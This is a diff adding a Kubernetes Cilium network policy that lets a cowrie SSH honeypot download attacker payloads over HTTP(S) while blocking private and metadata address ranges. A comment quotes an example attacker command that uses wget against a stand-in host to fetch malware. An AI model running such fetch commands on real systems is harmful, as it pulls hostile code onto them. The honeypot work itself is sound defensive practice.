@@ -124,3 +124,53 @@ spec:
               protocol: UDP
             - port: "53"
               protocol: TCP
+---
+# Let cowrie FETCH the payloads attackers tell it to download — and nothing else.
+#
+# WHY THIS EXISTS. Cowrie emulates wget/curl: when an attacker runs `wget http://evil/x`,
+# cowrie retrieves that URL itself and stores the result in var/lib/cowrie/downloads as
+# a SHA-256-named file. With egress restricted to DNS, every such fetch failed, so the
+# honeypot collected commands and credentials but never a single SAMPLE. This closes that
+# gap deliberately — malware samples are the highest-value artifact a honeypot produces.
+#
+# THIS IS THE ONE RULE THAT WEAKENS CONTAINMENT, so it is drawn as tightly as possible:
+#
+#   ports  ONLY 80/443. An attacker cannot use cowrie to reach C2 on an arbitrary port,
+#          SSH outward, or port-scan. Payload fetches are overwhelmingly plain HTTP(S).
+#
+#   except EVERY private range is excluded from 0.0.0.0/0. This is the load-bearing half.
+#          A bare `toEntities: world` would also admit 192.168.0.0/16 and the pod CIDR,
+#          turning the honeypot into a pivot onto the LAN — and this cluster still has
+#          unauthenticated services on plaintext :80 (TALOS-a8vo.3). Outbound may reach
+#          the internet; it may NOT reach anything of ours.
+#
+#   169.254.0.0/16 is excluded for the cloud-metadata/link-local SSRF class specifically.
+#
+# Still denied by default-deny-all: all other ports, all other protocols, all ingress
+# except 2222/2223, and any access to the Kubernetes API (no service-account token is
+# mounted). Captured samples are archived off-node by the cowrie-archive CronJob, which
+# is the ONLY thing that touches shared storage — cowrie itself never does.
+apiVersion: cilium.io/v2
+kind: CiliumNetworkPolicy
+metadata:
+  name: allow-sample-fetch-egress
+  namespace: honeypot
+spec:
+  endpointSelector:
+    matchLabels:
+      app: cowrie
+  egress:
+    - toCIDRSet:
+        - cidr: 0.0.0.0/0
+          except:
+            - 10.0.0.0/8 # pod/service CIDR + LAN supernet
+            - 172.16.0.0/12
+            - 192.168.0.0/16 # the home LAN
+            - 169.254.0.0/16 # link-local / cloud metadata (SSRF)
+            - 127.0.0.0/8
+      toPorts:
+        - ports:
+            - port: "80"
+              protocol: TCP
+            - port: "443"
+              protocol: TCP
